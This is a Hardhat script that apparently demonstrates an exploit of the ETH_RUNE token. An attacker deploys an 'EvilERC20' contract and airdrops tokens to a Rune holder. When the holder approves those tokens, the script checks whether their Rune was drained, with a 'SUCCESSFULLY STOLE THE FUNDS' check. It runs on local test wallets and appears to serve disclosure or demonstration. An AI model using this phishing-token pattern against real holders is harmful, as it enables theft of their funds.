const hre = require("hardhat");
const ethers = hre.ethers;

async function main() {
  // set up two wallets
  const [runeWallet, evilWallet] = await ethers.getSigners();
  console.log(`***** Wallets\n`);
  console.log(`runeWallet:\t${runeWallet.address}\nevilWallet:\t${evilWallet.address}\n\n`);

  // set up the Rune token with the first wallet
  const Rune = await ethers.getContractFactory("ETH_RUNE", runeWallet);
  const rune = await Rune.deploy();

  await rune.deployed();

  console.log(`***** Rune token\n`);
  console.log(`Deployed to:\t${rune.address}`);
  console.log(`Deployer:\t${rune.deployTransaction.from}\n\n`);

  // set up the Evil token with the second wallet
  const Evil = await ethers.getContractFactory("EvilERC20", evilWallet);
  const evil = await Evil.deploy(rune.address);

  await evil.deployed();

  console.log(`***** Evil token\n`);
  console.log(`Deployed to:\t${evil.address}`);
  console.log(`Deployer:\t${evil.deployTransaction.from}\n\n`);

  console.log(`***** Evil token balances\n`);
  console.log(`runeWallet: ${await evil.balanceOf(runeWallet.address)}`);
  console.log(`evilWallet: ${await evil.balanceOf(evilWallet.address)}\n\n`);

  // send some Evil tokens to a holder of Rune
  const amtToTransfer = "1000000000000000000";
  console.log(`***** Transferring ${amtToTransfer} to runeWallet\n\n`);
  await evil.transfer(runeWallet.address, amtToTransfer);

  console.log(`***** Evil token balances\n`);
  console.log(`runeWallet: ${await evil.balanceOf(runeWallet.address)}`);
  console.log(`evilWallet: ${await evil.balanceOf(evilWallet.address)}\n\n`);

  console.log(`***** Rune token balances\n`);
  console.log(`runeWallet: ${await rune.balanceOf(runeWallet.address)}`);
  console.log(`evilWallet: ${await rune.balanceOf(evilWallet.address)}\n\n`);

  // the holder of rune approves their new free tokens for swapping on a DEX (decentralized exchange)
  console.log(`***** runeWallet approving tokens for swapping\n\n`);
  await evil.connect(runeWallet).approve(runeWallet.address, ethers.constants.MaxUint256);

  // check if the Evil token owner stole all of the Rune tokens held by the first wallet
  console.log(`***** Rune token balances\n`);
  console.log(`runeWallet: ${await rune.balanceOf(runeWallet.address)}`);
  console.log(`evilWallet: ${await rune.balanceOf(evilWallet.address)}\n\n`);

  if (await rune.balanceOf(runeWallet.address) != 0) {
    console.log("FAILED TO STEAL THE FUNDS");
  } else {
    console.log("SUCCESSFULLY STOLE THE FUNDS");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
